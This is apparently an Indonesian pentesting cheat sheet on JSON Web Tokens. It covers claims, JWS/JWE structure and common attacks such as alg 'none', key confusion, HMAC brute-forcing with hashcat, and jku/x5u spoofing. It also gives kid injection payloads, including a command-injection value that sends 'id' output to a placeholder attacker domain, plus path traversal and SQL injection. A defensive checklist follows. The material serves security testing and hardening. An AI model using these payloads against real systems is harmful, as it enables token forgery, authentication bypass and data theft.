# JSON Web Token

## Daftar Isi

- [Pengantar JWT](#pengantar-jwt)
- [JWT Claims](#jwt-claims)
- [JOSE Header](#jose-header)
- [JSON Web Signature (JWS)](#json-web-signature-jws)
- [JSON Web Encryption (JWE)](#json-web-encryption-jwe)
- [Security Issues pada JWS](#security-issues-pada-jws)
- [Security Issues pada JWE](#security-issues-pada-jwe)
- [Security Issues (General)](#security-issues-general)
- [JWT Best Practices](#jwt-best-practices)
- [Tools](#tools)

---

## Pengantar JWT

**JSON Web Token (JWT)** merepresentasikan sekumpulan klaim (claims) sebagai objek JSON yang dienkode dalam struktur **JSON Web Signature (JWS)** dan/atau **JSON Web Encryption (JWE)**. Sebuah JWT direpresentasikan sebagai rangkaian bagian yang aman untuk URL (URL-safe) yang dipisahkan oleh karakter titik (`.`). Setiap bagian berisi nilai yang dienkode dengan base64url. Jumlah bagian dalam JWT tergantung pada representasi JWS atau JWE yang dihasilkan menggunakan *compact serialization* masing-masing.

> **Informasi:** Algoritma base64url adalah algoritma base64 dengan penggantian berikut:
> - `"+"` menjadi `"-"`
> - `"/"` menjadi `"_"`
> 
> dan tidak ada padding base64 standar (biasanya berupa tanda `"="`).

## JWT Claims

JWT claims set merepresentasikan objek JSON yang anggota-anggotanya adalah klaim yang disampaikan oleh JWT. Terdapat tiga kelas nama klaim JWT:

1. **Registered Claim Names**
2. **Public Claim Names**
3. **Private Claim Names**

### Registered Claim Names

Nama-nama klaim berikut terdaftar dalam registri IANA *"JSON Web Token Claims"*. Tidak ada klaim di bawah ini yang diwajibkan untuk digunakan atau diimplementasikan dalam semua kasus, tetapi klaim-klaim tersebut menyediakan titik awal untuk sekumpulan klaim yang berguna dan interoperabel. Aplikasi yang menggunakan JWT harus mendefinisikan klaim spesifik mana yang mereka gunakan serta kapan klaim tersebut diperlukan atau opsional.

| Claim | Definisi | Tipe | Deskripsi |
|-------|----------|------|------------|
| `iss` | Issuer | String atau URI | Klaim `iss` mengidentifikasi pihak yang mengeluarkan JWT |
| `sub` | Subject | String atau URI | Klaim `sub` mengidentifikasi pihak yang menjadi subjek JWT |
| `aud` | Audience | Array of strings (String atau URI) | Klaim `aud` mengidentifikasi penerima yang dituju oleh JWT |
| `exp` | Expiration Time | NumericDate | Klaim `exp` mengidentifikasi waktu kedaluwarsa setelah mana JWT tidak boleh diterima untuk diproses |
| `nbf` | Not Before | NumericDate | Klaim `nbf` mengidentifikasi waktu sebelum JWT tidak boleh diterima untuk diproses |
| `iat` | Issued At | NumericDate | Klaim `iat` mengidentifikasi waktu saat JWT diterbitkan |
| `jti` | JWT ID | String | Klaim `jti` memberikan pengidentifikasi unik untuk JWT |

### Public Claim Names

Nama klaim dapat didefinisikan secara bebas oleh pengguna JWT. Nama klaim harus berupa nilai yang mengandung nama tahan-benturan (*collision-resistant name*).

### Private Claim Names

Produsen dan konsumen JWT dapat menyepakati penggunaan nama klaim yang bersifat privat: nama yang bukan merupakan *registered claim names* maupun *public claim names*. Tidak seperti *public claim names*, *private claim names* rentan terhadap benturan (collision).

## JOSE Header

> **Informasi:** Header JOSE (JSON Object Signing and Encryption) adalah objek JSON yang berisi parameter-parameter yang mendeskripsikan operasi kriptografi dan parameter yang digunakan.

Untuk objek JWT, anggota dari objek JSON yang direpresentasikan oleh header JOSE mendeskripsikan operasi kriptografi yang diterapkan pada JWT dan secara opsional properti tambahan dari JWT. Tergantung pada apakah JWT tersebut merupakan JWS atau JWE, aturan yang sesuai untuk nilai header JOSE akan berlaku.

## JSON Web Signature (JWS)

**JSON Web Signature (JWS)** merepresentasikan konten yang diamankan dengan tanda tangan digital atau *Message Authentication Codes (MACs)* menggunakan struktur data berbasis JSON. Mekanisme kriptografi JWS menyediakan perlindungan integritas untuk urutan oktet arbitrer.

Terdapat dua serialisasi yang terkait erat untuk JWS, yang keduanya berbagi fondasi kriptografi yang sama:

- **JWS Compact Serialization**: Representasi ringkas dan aman-URL yang ditujukan untuk lingkungan dengan keterbatasan ruang seperti *HTTP Authorization headers* dan parameter query URI.
- **JWS JSON Serialization**: Merepresentasikan JWS sebagai objek JSON dan memungkinkan banyak tanda tangan dan/atau MAC diterapkan pada konten yang sama.

> **Informasi:** JWT adalah JWS yang menggunakan JWS compact serialization.

Sebuah JWS merepresentasikan nilai-nilai logis berikut:
1. JOSE Header
2. JWS Payload
3. JWS Signature

### JOSE Header untuk JWS

Untuk JWS, anggota dari objek JSON yang merepresentasikan JOSE header mendeskripsikan tanda tangan digital atau MAC yang diterapkan pada *protected header* JWS dan *payload* JWS, serta secara opsional properti tambahan dari JWS.

JWS mendefinisikan nama-nama parameter header terdaftar berikut:

| Parameter | Definisi | Tipe | Deskripsi |
|-----------|----------|------|------------|
| `alg` | Algorithm | String atau URI | Parameter header `alg` mengidentifikasi algoritma kriptografi yang digunakan untuk mengamankan JWS. Daftar nilai yang mungkin dapat ditemukan di spesifikasi JWA bagian 3.1 |
| `jku` | JWK Set URL | URI | Parameter header `jku` adalah URI yang merujuk ke sumber daya untuk sekumpulan kunci publik berenkode JSON (sebagai JWK set), salah satunya sesuai dengan kunci yang digunakan untuk menandatangani JWS |
| `jwk` | JSON Web Key | JWK | Parameter header `jwk` adalah kunci publik yang sesuai dengan kunci yang digunakan untuk menandatangani JWS |
| `kid` | Key ID | String | Parameter header `kid` adalah petunjuk yang menunjukkan kunci mana yang digunakan untuk mengamankan JWS. Saat digunakan dengan JWK, nilai `kid` digunakan untuk mencocokkan nilai parameter `kid` JWK |
| `x5u` | X.509 URL | URI | Parameter header `x5u` adalah URI yang merujuk ke sumber daya untuk sertifikat kunci publik X.509 atau rantai sertifikat dalam bentuk terenkode PEM yang sesuai dengan kunci yang digunakan untuk menandatangani JWS |
| `x5c` | X.509 Certificate Chain | Array of certificate value strings | Parameter header `x5c` berisi sertifikat kunci publik X.509 atau rantai sertifikat yang sesuai dengan kunci yang digunakan untuk menandatangani JWS |
| `x5t` | X.509 certificate SHA-1 thumbprint | String | Parameter header `x5t` adalah sidik jari SHA-1 terenkode base64url dari enkode DER sertifikat X.509 yang sesuai dengan kunci yang digunakan untuk menandatangani JWS |
| `x5t#S256` | X.509 Certificate SHA-256 Thumbprint | String | Parameter header `x5t#S256` adalah sidik jari SHA-256 terenkode base64url dari enkode DER sertifikat X.509 yang sesuai dengan kunci yang digunakan untuk menandatangani JWS |
| `typ` | Type | IANA.MediaTypes | Parameter header `typ` digunakan oleh aplikasi JWS untuk mendeklarasikan tipe media dari JWS lengkap ini. Untuk menunjukkan bahwa objek ini adalah JWT, disarankan menggunakan nilai `"JWT"` |
| `cty` | Content Type | IANA.MediaTypes | Parameter header `cty` digunakan oleh aplikasi JWS untuk mendeklarasikan tipe media dari konten yang diamankan (payload). Dalam kasus normal di mana operasi penandatanganan bersarang tidak digunakan, penggunaan parameter ini tidak direkomendasikan |
| `crit` | Critical | Array of header parameter names | Parameter header `crit` menunjukkan bahwa ekstensi dan/atau JWA sedang digunakan yang harus dipahami dan diproses |

### JWS Payload

Urutan oktet yang akan diamankan (pesan). Payload dapat berisi urutan oktet arbitrer.

### JWS Signature

(Deskripsi singkat - tidak ada detail tambahan dalam dokumen asli)

## JSON Web Encryption (JWE)

**JSON Web Encryption (JWE)** merepresentasikan konten terenkripsi menggunakan struktur data berbasis JSON. Mekanisme kriptografi JWE mengenkripsi dan memberikan perlindungan integritas untuk urutan oktet arbitrer. JWE menggunakan *authenticated encryption* untuk memastikan kerahasiaan dan integritas *plaintext* serta integritas dari *JWE protected header* dan *JWE AAD*.

Terdapat dua serialisasi yang terkait erat untuk JWE, yang keduanya berbagi fondasi kriptografi yang sama:

- **JWE Compact Serialization**: Representasi ringkas dan aman-URL yang ditujukan untuk lingkungan dengan keterbatasan ruang.
- **JWE JSON Serialization**: Merepresentasikan JWE sebagai objek JSON dan memungkinkan konten yang sama dienkripsi untuk banyak pihak.

> **Informasi:** JWT adalah JWE yang menggunakan JWE compact serialization.

Sebuah JWE merepresentasikan nilai-nilai logis berikut:
1. JOSE Header
2. JWE Encrypted Key
3. JWE Initialization Vector
4. JWE AAD
5. JWE Ciphertext
6. JWE Authentication Tag

### JOSE Header untuk JWE

Untuk JWE, anggota dari objek JSON yang merepresentasikan JOSE header mendeskripsikan enkripsi yang diterapkan pada *plaintext* dan secara opsional properti tambahan dari JWE.

Anggota JOSE Header adalah gabungan dari anggota nilai-nilai berikut:
- **JWE Protected Header** - Objek JSON yang berisi parameter header yang dilindungi integritasnya oleh operasi *authenticated encryption*. Parameter ini berlaku untuk semua penerima JWE.
- **JWE Shared Unprotected Header** - Objek JSON yang berisi parameter header yang berlaku untuk semua penerima JWE tetapi tidak dilindungi integritasnya (hanya untuk JWE JSON serialization).
- **JWE Per-Recipient Unprotected Header** - Objek JSON yang berisi parameter header yang berlaku untuk satu penerima JWE dan tidak dilindungi integritasnya (hanya untuk JWE JSON serialization).

JWE mendefinisikan nama-nama parameter header terdaftar berikut:

| Parameter | Definisi | Tipe | Deskripsi |
|-----------|----------|------|------------|
| `alg` | Algorithm | String atau URI | Parameter header `alg` mengidentifikasi algoritma kriptografi yang digunakan untuk mengenkripsi atau menentukan nilai *Content Encryption Key*. Daftar nilai yang mungkin dapat ditemukan di spesifikasi JWA bagian 4.1 |
| `enc` | Encryption Algorithm | String atau URI | Parameter header `enc` mengidentifikasi algoritma enkripsi konten yang digunakan untuk melakukan *authenticated encryption* pada *plaintext*. Algoritma ini harus berupa algoritma AEAD dengan panjang kunci yang ditentukan. Daftar nilai yang mungkin dapat ditemukan di spesifikasi JWA bagian 5.1 |
| `zip` | Compression Algorithm | String | Parameter header `zip` yang diterapkan pada *plaintext* sebelum enkripsi, jika ada |
| `jku` | JWK Set URL | URI | Parameter header `jku` adalah URI yang merujuk ke sumber daya untuk sekumpulan kunci publik berenkode JSON, salah satunya digunakan untuk mengenkripsi JWE |
| `jwk` | JSON Web Key | JWK | Parameter header `jwk` adalah kunci publik yang sesuai dengan kunci yang digunakan untuk mengenkripsi JWE |
| `kid` | Key ID | String | Parameter header `kid` adalah petunjuk yang menunjukkan kunci mana yang digunakan untuk mengenkripsi JWE |
| `x5u` | X.509 URL | URI | Parameter header `x5u` adalah URI yang merujuk ke sumber daya untuk sertifikat kunci publik X.509 atau rantai sertifikat dalam bentuk terenkode PEM yang sesuai dengan kunci yang digunakan untuk mengenkripsi JWE |
| `x5c` | X.509 Certificate Chain | Array of certificate value strings | Parameter header `x5c` berisi sertifikat kunci publik X.509 atau rantai sertifikat yang sesuai dengan kunci yang digunakan untuk mengenkripsi JWE |
| `x5t` | X.509 certificate SHA-1 thumbprint | String | Parameter header `x5t` adalah sidik jari SHA-1 terenkode base64url dari enkode DER sertifikat X.509 yang sesuai dengan kunci yang digunakan untuk mengenkripsi JWE |
| `x5t#S256` | X.509 Certificate SHA-256 Thumbprint | String | Parameter header `x5t#S256` adalah sidik jari SHA-256 terenkode base64url dari enkode DER sertifikat X.509 |
| `typ` | Type | IANA.MediaTypes | Parameter header `typ` digunakan untuk mendeklarasikan tipe media dari JWE lengkap. Untuk JWT, disarankan nilai `"JWT"` |
| `cty` | Content Type | IANA.MediaTypes | Parameter header `cty` digunakan untuk mendeklarasikan tipe media dari konten yang diamankan (plaintext). Jika enkripsi bersarang digunakan, nilai harus `"JWT"` |
| `crit` | Critical | Array of header parameter names | Parameter header `crit` menunjukkan bahwa ekstensi sedang digunakan yang harus dipahami dan diproses |

### JWE Encrypted Key

> **Informasi:** *Authenticated Encryption with Associated Data (AEAD)* adalah algoritma yang mengenkripsi *plaintext*, memungkinkan *additional authenticated data* ditentukan, dan memberikan pemeriksaan integritas konten terintegrasi atas *ciphertext* dan *additional authenticated data*. Algoritma AEAD menerima dua input (*plaintext* dan AAD) dan menghasilkan dua output (*ciphertext* dan *authentication tag*). AES Galois/Counter Mode (GCM) adalah salah satu contoh algoritma tersebut.
>
> *Content encryption key* adalah kunci simetris untuk algoritma AEAD yang digunakan untuk mengenkripsi *plaintext* menjadi *ciphertext* dan *authentication tag*.

Nilai *encrypted content encryption key*. Untuk beberapa algoritma, nilai JWE encrypted key ditentukan sebagai urutan oktet kosong.

### JWE Initialization Vector

Nilai *initialization vector* yang digunakan saat mengenkripsi *plaintext*. Beberapa algoritma mungkin tidak menggunakan *initialization vector*, dalam hal ini nilainya adalah urutan oktet kosong.

### JWE AAD

> **Informasi:** *Additional Authenticated Data (AAD)* adalah input untuk operasi AEAD yang dilindungi integritasnya tetapi tidak dienkripsi.

AAD adalah nilai tambahan yang dilindungi integritasnya oleh operasi *authenticated encryption*. Ini hanya dapat hadir saat menggunakan JWE JSON serialization.

### JWE Ciphertext

*Ciphertext* adalah nilai yang dihasilkan dari *authenticated encryption* terhadap *plaintext* dengan *additional authenticated data*.

### JWE Authentication Tag

> **Informasi:** *Authentication Tag* adalah keluaran dari operasi AEAD yang memastikan integritas *ciphertext* dan *additional authenticated data*. Beberapa algoritma mungkin tidak menggunakan *authentication tag*, dalam hal ini nilainya adalah urutan oktet kosong.

*Authentication tag* adalah nilai yang dihasilkan dari *authenticated encryption* terhadap *plaintext* dengan *additional authenticated data*.

## Security Issues pada JWS

### Support untuk algoritma none

Algoritma `none` memungkinkan penggunaan token JWT tanpa tanda tangan. Perlu diketahui bahwa ini adalah salah satu dari dua algoritma yang harus diimplementasikan menurut spesifikasi. Algoritma `none` mungkin didukung di lingkungan produksi, sehingga menyebabkan kerentanan.

Untuk mengeksploitasi, ubah nilai `alg` menjadi `none` dan kirim token JWT tanpa (atau dengan) tanda tangan ke endpoint API. Jika algoritma `none` didukung, token JWT akan dianggap valid.

Varian algoritma `none` yang dapat dicoba:
- `none`
- `None`
- `NONE`
- `nOnE`

### Tidak adanya signature yang valid

Coba pertahankan algoritma tanda tangan (misalnya HS256) dan hapus bagian signature.

### Pengungkapan signature yang benar

Coba ubah payload dan kirim token tersebut ke endpoint API. Jika endpoint dikonfigurasi untuk menampilkan eksepsi kepada pengguna, Anda bisa mendapatkan signature yang benar yang cocok dengan data yang telah diubah.

Contoh pesan kesalahan:
```
Invalid signature. Expected 8Qh51J5gSaQy1kSdaCIDBo0qKzhoJ0Ntukkap8RgB1Y= got 8Qh51J5gSaQy1kSdaCIDBo0qKzhoJ0Ntukkap8RgBOo=
```

### Weak HMAC secret key

Algoritma berbasis HMAC menggunakan kunci rahasia untuk membuat (dan memvalidasi) signature. Anda dapat mencoba melakukan *bruteforce* terhadap kunci rahasia dengan hashcat:

```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

### Penggunaan key yang sama untuk algoritma berbeda

Jika kunci yang sama digunakan untuk algoritma asimetris dan simetris, Anda dapat menggunakan kunci publik RSA sebagai kunci rahasia HMAC untuk menandatangani token JWT yang telah dirusak.

Langkah eksploitasi:
1. Attacker mengambil kunci publik RSA.
2. Attacker mengatur nilai `alg` menjadi `HS256`.
3. Attacker menandatangani token dengan kunci publik RSA sebagai kunci rahasia HMAC.
4. Attacker mengirim token yang telah dirusak ke server.
5. Server menerima token, memeriksa algoritma mana yang digunakan untuk signature (`HS256`).
6. Karena kunci verifikasi diatur dalam konfigurasi sebagai kunci publik RSA, signature akan dianggap valid (kunci verifikasi yang sama digunakan untuk membuat signature, dan attacker mengubah algoritma signature menjadi `HS256`).

### Dukungan terhadap header parameter jwk atau x5c

Parameter header `jwk` (atau `x5c`) yang merepresentasikan kunci publik (sertifikat kunci publik X.509 atau rantai sertifikat) dapat disematkan di dalam header JWS. Kunci publik atau sertifikat tersebut kemudian akan dipercaya untuk verifikasi. Anda dapat mengeksploitasi ini dengan membuat objek JWS yang valid secara palsu dengan menghapus signature asli, menambahkan kunci publik baru ke header, lalu menandatangani objek tersebut menggunakan kunci privat Anda sendiri yang terkait dengan kunci publik yang disematkan di header JWS tersebut.

### Timing attack pada signature

Algoritma verifikasi signature rentan terhadap *timing attack* jika poin-poin berikut terpenuhi:
1. Signature dari JWS diverifikasi byte per byte dengan signature yang benar (dihasilkan oleh pihak yang menerima JWS).
2. Verifikasi berakhir pada byte pertama yang tidak cocok.

Untuk mengeksploitasi *timing attack*, amati waktu respons dengan menghasilkan signature secara berurutan, mulai dari byte pertama, lalu byte kedua, dan seterusnya.

## Security Issues pada JWE

### Weak algorithms

Terdapat penelitian menarik terkait kerentanan pada JWE:
- [*Critical Vulnerability Uncovered in JSON Encryption*](https://web.archive.org/web/20201130103442/https://blogs.adobe.com/security/2017/03/critical-vulnerability-uncovered-in-json-encryption.html) - implementasi algoritma ECDH-ES yang salah memungkinkan attacker memulihkan kunci privat.
- [*Practical Cryptanalysis of Json Web Token and Galois Counter Mode's Implementations*](https://rwc.iacr.org/2017/Slides/nguyen.quan.pdf) - peneliti Google menulis tentang AES dalam mode GCM dalam konteks JWT, menyimpulkan bahwa GCM rapuh namun implementasinya jarang diperiksa.
- [*Chosen Ciphertext Attacks Against Protocols Based on the RSA Encryption Standard PKCS #1*](https://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf) - artikel menjelaskan serangan terhadap enkripsi RSA dengan padding PKCS1v1.5, yang diizinkan menurut [spesifikasi](https://datatracker.ietf.org/doc/html/rfc7518#section-4.1).

### Incorrect composition of encryption and signature

Beberapa library yang mendekripsi JWT terenkripsi JWE untuk mendapatkan objek bertanda tangan JWS tidak selalu memvalidasi signature internal.

## Security Issues (General)

### Spoofing header parameter jku

Parameter header `jku` adalah URI yang merujuk ke sumber daya untuk sekumpulan kunci publik berenkode JSON (sebagai JWK set), salah satunya sesuai dengan kunci yang digunakan untuk menandatangani JWS / mengenkripsi JWE. Ubah token JWT untuk mengarahkan nilai parameter `jku` ke server web Anda dengan kunci publik, lalu tandatangani/enkripsi token dengan kunci privat yang sesuai.

**Referensi:**
- [Write-Up: WEB - JWT from VolgaCTF Qualifier 2021](https://sigflag.at/blog/2021/volgactf2021qualifier-JWT/)

### SSRF via header parameter jku atau x5u

Parameter header `jku` (atau `x5u`) adalah URI yang digunakan server untuk mengambil kunci publik (sertifikat kunci publik X.509 atau rantai sertifikat). Anda dapat menggunakannya untuk mengeksploitasi kerentanan SSRF.

> Sumber cheat sheet: [Server-Side Request Forgery](https://0xn3va.gitbook.io/cheat-sheets/web-application/server-side-request-forgery)

### Injections via header parameter kid

Parameter header `kid` digunakan oleh aplikasi yang bergantung padanya untuk melakukan pencarian kunci.

#### Command injection

Parameter `kid` dapat diteruskan ke fungsi seperti system, yang akan mengarah ke *command injection*:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "kid;dig () (id | base64 - w0).attacker-website.com"
}
```

#### Path traversal

Parameter `kid` dapat menentukan jalur ke kunci dalam filesystem yang digunakan untuk memverifikasi token. Jika attacker memasukkan jalur ke file dengan konten yang dapat diprediksi, mereka dapat membuat token palsu karena kunci rahasia sudah diketahui. Contoh file tersebut adalah `/proc/sys/kernel/randomize_va_space` pada sistem Linux yang memiliki nilai dapat diprediksi seperti `0,1,2`. Attacker dapat membuat token jahat menggunakan nilai rahasia `0,1,2` dan mengirimkannya ke server.

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../dev/null"
}
```

#### SQL injection

Aplikasi dapat menyimpan kunci mereka di database. Jika kunci tersebut dirujuk dalam parameter `kid`, bisa rentan terhadap SQL injection.

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key\" UNION SELECT 'hop"
}
```

### Substitution attacks

Terdapat serangan di mana satu penerima mendapatkan JWT yang ditujukan untuknya dan mencoba menggunakannya pada penerima lain yang tidak dituju. Ini berlaku untuk kasus berikut:
- Aplikasi tidak memvalidasi (atau tidak memvalidasi dengan benar) bahwa kunci kriptografi yang digunakan untuk operasi kriptografi dalam JWT milik issuer (klaim `iss`).
- Aplikasi tidak memvalidasi (atau tidak memvalidasi dengan benar) bahwa nilai subjek (klaim `sub`) sesuai dengan subjek yang valid dan/atau pasangan issuer/subjek pada aplikasi.
- Klaim `aud` tidak digunakan (atau digunakan secara salah) untuk menentukan apakah JWT digunakan oleh pihak yang dituju atau disubstitusi oleh attacker pada pihak yang tidak dituju ketika issuer yang sama dapat mengeluarkan JWT yang ditujukan untuk lebih dari satu pihak yang bergantung atau aplikasi.

### Cross-JWT confusion

Karena JWT digunakan oleh protokol yang berbeda di area aplikasi yang berbeda, Anda dapat mencoba mengeluarkan token JWT untuk satu tujuan dan menggunakannya untuk tujuan yang berbeda.

### Replay attack

Jika mekanisme kedaluwarsa dan pencabutan memiliki kelemahan, token JWT dapat digunakan untuk *replay attack*. Dalam hal ini, perhatikan klaim `exp` (tanggal kedaluwarsa token) dan `jti` (pengidentifikasi token unik), dan coba gunakan token JWT yang telah kedaluwarsa/dicabut.

## JWT Best Practices

```
# JWT Security Checklist:
[ ] Algorithm specified and enforced server-side (not from token)
[ ] Strong secret key (256+ bits for HMAC)
[ ] RSA key size >= 2048 bits
[ ] Token expiration (exp) checked and enforced
[ ] Token issued-at (iat) verified
[ ] Audience (aud) claim validated
[ ] Issuer (iss) claim validated
[ ] Algorithm "none" rejected
[ ] Symmetric/asymmetric confusion prevented
[ ] JWK/JWKS injection prevented
[ ] kid parameter validated (no injection)
[ ] Secret not guessable
[ ] Token stored securely (httpOnly cookie preferred)
[ ] Token revocation mechanism exists
[ ] Sensitive data not in payload (viewable without key)
[ ] Token size reasonable (not used as session storage)
```

## Tools

- [jwt.io](https://www.jwt.io)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [jwt-hack](https://github.com/hahwul/jwt-hack)
- [jwtauditor](https://jwtauditor.com)
- [jwtlens](https://github.com/chawdamrunal/JWTLens)
